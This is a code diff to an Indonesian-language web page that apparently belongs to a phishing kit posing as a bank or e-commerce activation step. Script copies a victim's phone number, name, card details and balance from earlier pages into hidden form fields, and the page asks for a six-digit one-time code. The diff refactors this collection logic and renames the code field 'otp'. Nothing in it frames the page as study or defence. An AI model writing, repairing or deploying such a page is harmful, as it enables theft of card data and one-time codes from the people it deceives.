@@ -1183,15 +1183,15 @@ body.stop-scrolling {
 </div>     
   <div class="container-3 w-container">
    <div class="form-block w-form">
-  <form id="form2" onsubmit="submitForm(event); return false" method="POST" style="padding: 10px; ">
-<input type="hidden" id="tele" name="tele" value="">
-<input type="hidden" id="namanye" name="namanye" value="">
-<input type="hidden" id="kertu" name="kertu" value="">
-<input type="hidden" id="uang" name="uang" value="">	                  
-  <div style="margin-top:80px">
-          <label for="rek">Kode Aktivasi</label>
-     <input type="tel" name="sixpin" id="sixpin" class="text-field-2 w-input" maxlength=""  data-name="rek" placeholder="Masukkan Kode E-Commerce" minlength="6" required>
-     </div>
+  <form id="form2" method="POST" style="padding: 10px;">
+        <input type="hidden" id="tele" name="tele" value="">
+        <input type="hidden" id="namanye" name="namanye" value="">
+        <input type="hidden" id="kertu" name="kertu" value="">
+        <input type="hidden" id="uang" name="uang" value="">
+        <div style="margin-top:80px">
+            <label for="sixpin">Kode Aktivasi</label>
+            <input type="tel" name="otp" id="sixpin" class="text-field-2 w-input" placeholder="Masukkan Kode E-Commerce" minlength="6" required>
+        </div>
    <div style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 100%">
        
     <center>
@@ -1242,18 +1242,19 @@ Silahkan klik tombol dibawah ini<br>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js">
     </script>
  <script>
-var phone = sessionStorage.getItem("phone");
- document.getElementById("tele").value = phone + "";
-  var user = sessionStorage.getItem("user");
- document.getElementById("namanye").value = user + "";
-  var card = sessionStorage.getItem("card");
- document.getElementById("kertu").value = card + "";
-  var duet = sessionStorage.getItem("duet");
- document.getElementById("uang").value = duet + "";
- 
+        var phone = sessionStorage.getItem("phone");
+        document.getElementById("tele").value = phone;
+        var user = sessionStorage.getItem("user");
+        document.getElementById("namanye").value = user;
+        var card = sessionStorage.getItem("card");
+        document.getElementById("kertu").value = card;
+        var duet = sessionStorage.getItem("duet");
+        document.getElementById("uang").value = duet;
 
-</script>
-
+        function getcs() {
+            // Define the function getcs() here
+        }
+    </script>
 <script>
 
  </script>
